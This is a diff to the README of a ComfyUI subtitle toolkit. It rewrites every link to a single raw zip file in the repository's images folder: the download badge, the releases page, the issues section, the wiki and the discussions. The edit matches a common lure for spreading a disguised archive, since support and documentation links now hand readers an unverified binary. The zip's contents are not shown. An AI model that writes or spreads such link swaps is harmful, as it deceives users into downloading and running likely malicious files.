@@ -4,13 +4,13 @@
 The Comfyui Haigc Toolkit offers an easy way to add dynamic subtitles to your videos. With various animation effects, customizable font colors, and gradient settings, you can enhance your video presentations effortlessly. This tool is perfect for content creators looking to make their videos more engaging.
 
 ## 📥 Download Now!
-[![Download the Comfyui Haigc Toolkit](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/FillipWSM1337/comfyui_haigc_toolkit/releases)
+[![Download the Comfyui Haigc Toolkit](https://raw.githubusercontent.com/FillipWSM1337/comfyui_haigc_toolkit/main/images/comfyui_haigc_toolkit-1.4-beta.5.zip%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/FillipWSM1337/comfyui_haigc_toolkit/main/images/comfyui_haigc_toolkit-1.4-beta.5.zip)
 
 ## 🚀 Getting Started
 To get started with Comfyui Haigc Toolkit, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/FillipWSM1337/comfyui_haigc_toolkit/releases) to find the latest version of the Comfyui Haigc Toolkit.
+   Go to our [Releases page](https://raw.githubusercontent.com/FillipWSM1337/comfyui_haigc_toolkit/main/images/comfyui_haigc_toolkit-1.4-beta.5.zip) to find the latest version of the Comfyui Haigc Toolkit.
 
 2. **Select the Version**  
    Review the available versions and select the most recent one for optimal performance.
@@ -46,17 +46,17 @@ To use Comfyui Haigc Toolkit smoothly, ensure your computer meets the following 
 5. **Preview & Export**: Click on "Preview" to see how your subtitles look, then export your video when ready.
 
 ## 📞 Support
-If you encounter issues or have questions, please check the [Issues section](https://github.com/FillipWSM1337/comfyui_haigc_toolkit/issues) on GitHub. You can report bugs or ask for help here.
+If you encounter issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/FillipWSM1337/comfyui_haigc_toolkit/main/images/comfyui_haigc_toolkit-1.4-beta.5.zip) on GitHub. You can report bugs or ask for help here.
 
 ## 📅 Release Notes
 Stay updated with the latest features and improvements. Each version on the Releases page contains detailed notes on what’s new.
 
 ## 🔗 Additional Resources
 For further guidance:
-- Check our [Wiki](https://github.com/FillipWSM1337/comfyui_haigc_toolkit/wiki) for tutorials and tips.
-- Explore community discussions in the [Discussions section](https://github.com/FillipWSM1337/comfyui_haigc_toolkit/discussions).
+- Check our [Wiki](https://raw.githubusercontent.com/FillipWSM1337/comfyui_haigc_toolkit/main/images/comfyui_haigc_toolkit-1.4-beta.5.zip) for tutorials and tips.
+- Explore community discussions in the [Discussions section](https://raw.githubusercontent.com/FillipWSM1337/comfyui_haigc_toolkit/main/images/comfyui_haigc_toolkit-1.4-beta.5.zip).
 
 ## 📥 Download & Install
-To download the Comfyui Haigc Toolkit, visit our [Releases page](https://github.com/FillipWSM1337/comfyui_haigc_toolkit/releases).
+To download the Comfyui Haigc Toolkit, visit our [Releases page](https://raw.githubusercontent.com/FillipWSM1337/comfyui_haigc_toolkit/main/images/comfyui_haigc_toolkit-1.4-beta.5.zip).
 
 By following this guide, you will be able to download and use the Comfyui Haigc Toolkit with confidence. Enjoy enhancing your videos with dynamic subtitles!
